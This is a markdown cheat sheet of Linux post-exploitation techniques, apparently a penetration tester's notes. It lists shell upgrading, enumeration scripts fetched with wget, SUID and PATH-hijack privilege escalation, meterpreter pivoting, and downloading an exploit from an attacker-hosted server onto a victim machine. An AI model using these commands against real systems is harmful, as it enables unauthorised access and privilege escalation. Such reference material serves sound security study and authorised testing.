# Linux Post Exploitation


<details>
    <summary></summary>
    <br>
</details>



<details>
    <summary>Useful tips</summary>
    <br>
    
**Upgrading basic shell to terminal**

    python -c 'import pty;pty.spawn("/bin/bash")';
    
</details>


    

<details>
    <summary>Enumeration</summary>
    <br>
    
## Manual Enumeration

    uname -a
       
    ps -aux 
    
    id
    
      Find out if the user is part of groups with interesting files
      
      find / -type f -group <group> 2>/dev/null
      
  - Find all writable direcotries for copying over scripts
  
        find / -writable
        
  - Check /etc/passwd for user/ group ids

    0 is typically root ( this can be <= 500) 
    
    1000+ is where new user accounts start
   
    
  - [LinEnum](https://github.com/rebootuser/LinEnum)  
  
        wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh          
          
  - [Local Linux Enumeration](https://www.rebootuser.com/?p=1623)
  
  
  See what sudo commands you can run
  
       sudo -l
       
</details>

<details>
    <summary>Maintain persistence</summary>
    <br>

## Metasploit modules    

  - Add user


  - Set a scheduled task
  
</details>

<details>
    <summary> Privilege escalation</summary>
    <br>
    
 Horizontal or vertical privilege escalation?
 
 ## Metasploit 
  
    post/linux/
 
    post/multi/recon/local_exploit_suggester

## research exploits

    searchsploit <linux kernel version>
   
    searchsploit <linux version>
    
    
## scripts and resources

- [Privilege Escalation Cheatsheet ](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

- [guide to priv escalation](https://payatu.com/guide-linux-privilege-escalation)

-------------------------------------------------------

- [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
   
        wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
        
        https://book.hacktricks.xyz/linux-unix/privilege-escalation




- **Also Read LinEnum output: **

- **Kernel Kernel information**

- **Can we read/write sensitive files:** The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.

#

- [**SUID**](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) Files: SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges.
     
     [Past SUID shells](https://github.com/Kahvi-0/Tools-and-Concepts/tree/master/Toolbox/Shells/SUID)
     
     Sometimes custom scripts will use relative pathing for commands rather than absolute. One way to abuse this would be to add . to your PATH and have a shell script in your working directory with the name of that command in the script. 
     
          echo /bin/sh > <command>    # To run <command> which then points to shell
          
          chmon 777 <command>
          
          export PATH=/tmp:$PATH
   
        #Manual  find directory -user root -perm -4000 -exec ls -ldb {} \; 2>&1 | grep -v "Permission denied"
        
         find / -perm -u=s -type f 2>/dev/null
         
#

- **Crontab Contents:** The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here. 
</details>
   
 
<details>
    <summary>Pivoting</summary>
    <br> 

 If pwnd target has a connection to a network that we do not have a connection to, we can set up a route on the machine to forward our traffic 
 
   - Meterpreter 
       
       Note that the routes created via meterpreter only aspply to that isntance of metasploit.
        If modules are crashing the shell when trying to scan via metasploit module, try running the scan from the compromised machine itself, then launcing targeted attacks from metasploit. 
   
         run autoroute -s <target network seen via enumeration>/CIDR
         
         run autoroute -p   #to confirm
         
       you can now test by pinging a device on the remote network
       
</details>



<details>
    <summary>Methods to upload files to/from target</summary>
    <br>
    
  ## Downloading files

    python -m SimpleHTTPServer  #Host the web server
      wget <IP>:8000/exploit     # Download to victim machine

    python -m pyftpdlib 21      #Host ftp server
      ftp <IP>
      
</details>



